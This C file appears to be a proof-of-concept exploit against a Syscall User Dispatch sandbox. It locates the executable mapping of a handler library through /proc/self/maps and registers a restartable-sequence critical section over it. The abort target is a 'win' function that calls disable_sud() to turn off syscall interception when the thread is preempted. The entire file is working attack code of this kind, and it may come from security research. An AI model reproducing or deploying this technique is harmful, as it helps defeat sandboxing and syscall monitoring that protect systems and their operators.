#define _GNU_SOURCE

#include <linux/rseq.h>
#include <sys/syscall.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <ucontext.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include "_libattack.h"


#define RSEQ_SIG 0x53053053

__thread struct rseq __rseq_abi;

int win(){
    disable_sud();
    sud_test();
}

static void function_a(void)
{
    printf("descheduled/preempted\n");
}

static inline int register_rseq(void)
{
    return syscall(SYS_rseq,
                   &__rseq_abi,
                   sizeof(__rseq_abi),
                   0,
                   RSEQ_SIG);
}




int state = 0;
void get_mappings(char** start, char** end){
    FILE *maps_file = fopen("/proc/self/maps", "r");

    if (maps_file == NULL) {
        fprintf(stderr, "could not open proc/self/maps\n");
        exit(1);
    }

    char* end_ptr;
    char line[256];
    while (fgets(line, sizeof(line), maps_file) != NULL) {

        fprintf(stderr, "%s", line);
        end_ptr = line;
        if (!*end_ptr) continue;

        if(!strstr(line, "/output/libsegfault_handler.so")) continue;
        //extract start and end adress of memory maping
        //star_adress-end_adress rwxp ....
        uint64_t mapping_start = strtoll(end_ptr, &end_ptr, 16);


        if(mapping_start>=0x7fffffffffffffff)continue; //ignore vsyscall pages
        assert(*end_ptr++ == '-');
        uint64_t mapping_end = strtoll(end_ptr, &end_ptr, 16);

        if(!strstr(line, "xp")) continue;
        *start = (char*)mapping_start;
        *end = (char*)mapping_end;
        fclose(maps_file);
        return;
    }
}


int main(){
    char* start;
    char* end;
    get_mappings(&start, &end);
    struct rseq_cs __attribute__((aligned(32))) cs = {
    .version = 0,
    .flags = 0,
    .start_ip = (size_t)start,
    .post_commit_offset = (size_t)end,
    .abort_ip = (size_t)win,
    };
    __rseq_abi.rseq_cs = (unsigned long long)&cs;
    printf("starting rseq %p -> %p [%p]\n", start, end, win);
    int ret = register_rseq();

    printf("ret = %d\n", ret);
    return 1;
}
